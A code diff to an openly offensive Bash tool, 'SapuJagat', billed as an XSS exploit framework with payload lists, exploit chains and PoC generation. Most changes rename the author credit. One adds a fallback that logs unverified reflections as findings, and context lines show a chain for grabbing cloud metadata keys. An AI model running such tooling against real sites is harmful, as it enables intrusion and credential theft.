@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # ============================================================
 #   SapuJagat v28 — XSS Exploit Framework
-#   by BimaKesengsaraan · Karya anak bangsa
+#   by BimaBalance · Karya anak bangsa
 #   Compatible: Termux, Linux (Debian/Ubuntu/Kali/macOS)
 #   Playwright verify + screenshot + 250 payload + 5 chain
 # ============================================================
@@ -82,7 +82,9 @@ progress() {
     local cur="$1" total="$2" label="${3:-scan}"
     (( total == 0 )) && return
     local pct=$(( cur * 100 / total ))
-    local w=30 filled=$(( pct * w / 100 )) empty=$(( w - filled ))
+    local w=30
+    local filled=$(( pct * w / 100 ))
+    local empty=$(( w - filled ))
     local bar=""
     for ((i=0;i<filled;i++)); do bar+="█"; done
     for ((i=0;i<empty;i++)); do bar+="░"; done
@@ -101,7 +103,7 @@ BANNER() {
    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝
 EOF
     echo -e "${C}              SapuJagat v$VERSION — XSS Exploit"
-    echo -e "${W}                    by BimaKesengsaraan${NC}"
+    echo -e "${W}                    by BimaBalance${NC}"
     echo -e "${D}                       Karya anak bangsa${NC}"
     echo -e "${M}   ═══════════════════════════════════════════════════════════════════${NC}"
     echo ""
@@ -835,7 +837,7 @@ data.append({"ts": ts, "url": url, "param": param, "payload": payload,
              "context": ctx, "dialog_verified": verified, "evidence": evidence,
              "cvss_score": score, "severity": sev, "cvss_vector": cvec,
              "poc": poc, "screenshot": shot,
-             "tool": "sapujagat", "by": "BimaKesengsaraan"})
+             "tool": "sapujagat", "by": "BimaBalance"})
 json.dump(data, open(f, "w"), indent=2)
 PYJ
     STAT_FINDINGS=$((STAT_FINDINGS+1))
@@ -854,7 +856,7 @@ f, ctype, tgt, status, ev, ts = sys.argv[1:]
 try: data = json.load(open(f))
 except: data = []
 data.append({"ts": ts, "chain": ctype, "target": tgt, "status": status, "evidence": ev,
-             "tool": "sapujagat", "by": "BimaKesengsaraan"})
+             "tool": "sapujagat", "by": "BimaBalance"})
 json.dump(data, open(f, "w"), indent=2)
 PY
     STAT_CHAINS=$((STAT_CHAINS+1))
@@ -1034,6 +1036,17 @@ manual_scan() {
                         ssrf-metadata) chain_aws_key "$url" ;;
                     esac
                     break 2
+                elif (( VERIFY_HEADLESS == 0 )); then
+                    # reflection-only fallback (no playwright)
+                    STAT_DIALOG=$((STAT_DIALOG+0))
+                    hit "REFLECTION: $key @ $url (verify skipped)"
+                    echo "   payload: $payload"
+                    local imp=$(detect_impact "$payload")
+                    local itype="${imp%%|*}"
+                    local rest="${imp#*|}"
+                    local isev="${rest%%|*}"
+                    record "$url" "$key" "$payload" "$ctx" "reflection-only" "verify-skipped" "$isev" ""
+                    break 2
                 fi
             done < <(select_payloads "$ctx")
         done
@@ -1138,7 +1151,7 @@ gen_poc() {
         cat > "$script" <<POC
 #!/usr/bin/env bash
 # PoC #${idx} — ${url}
-# by BimaKesengsaraan · Karya anak bangsa
+# by BimaBalance · Karya anak bangsa
 # dialog_verified: ${verified}
 
 URL='${poc}'
@@ -1171,7 +1184,7 @@ gen_report() {
 
     {
         echo "# SapuJagat v$VERSION Report"
-        echo "**Author:** BimaKesengsaraan · Karya anak bangsa  "
+        echo "**Author:** BimaBalance · Karya anak bangsa  "
         echo "**Generated:** $ts  "
         echo "**Env:** $ENV_OS  "
         echo "**Target:** ${TARGET:-$URL_LIST}  "
@@ -1212,7 +1225,7 @@ gen_report() {
         echo '.stat{display:inline-block;padding:.5em 1em;background:#222;margin:.3em;border-radius:4px}'
         echo '.meta{color:#888;font-size:.9em}</style></head><body>'
         echo "<h1>SapuJagat v$VERSION — XSS Report</h1>"
-        echo "<p class=\"meta\"><b>Author:</b> BimaKesengsaraan · Karya anak bangsa<br>"
+        echo "<p class=\"meta\"><b>Author:</b> BimaBalance · Karya anak bangsa<br>"
         echo "<b>Generated:</b> $ts<br><b>Env:</b> $ENV_OS<br>"
         echo "<b>Target:</b> ${TARGET:-$URL_LIST}<br>"
         echo "<b>WAF:</b> $WAF_TYPE | <b>Tech:</b> ${TECH_STACK:-unknown}<br>"
@@ -1244,7 +1257,7 @@ gen_report() {
         else
             echo "<p>No findings.</p>"
         fi
-        echo "<p class=\"meta\" style=\"margin-top:3em;text-align:center\">SapuJagat v$VERSION by BimaKesengsaraan</p>"
+        echo "<p class=\"meta\" style=\"margin-top:3em;text-align:center\">SapuJagat v$VERSION by BimaBalance</p>"
         echo '</body></html>'
     } > "${base}.html"
 
@@ -1315,7 +1328,7 @@ ${W}  CONTOH${NC}
 
 ${M}  ═══════════════════════════════════════════════════════════════════${NC}
 ${D}  SapuJagat v$VERSION · MIT · Karya anak bangsa${NC}
-${D}  by BimaKesengsaraan${NC}
+${D}  by BimaBalance${NC}
 ${M}  ═══════════════════════════════════════════════════════════════════${NC}
 EOF
 }
@@ -1513,7 +1526,7 @@ main() {
     kv "Report"           "$OUTDIR/laporan.html"
     kv "PoC"              "$OUTDIR/exploits/"
     echo ""
-    echo -e "   ${D}by BimaKesengsaraan · Karya anak bangsa${NC}"
+    echo -e "   ${D}by BimaBalance · Karya anak bangsa${NC}"
     echo ""
 }
 
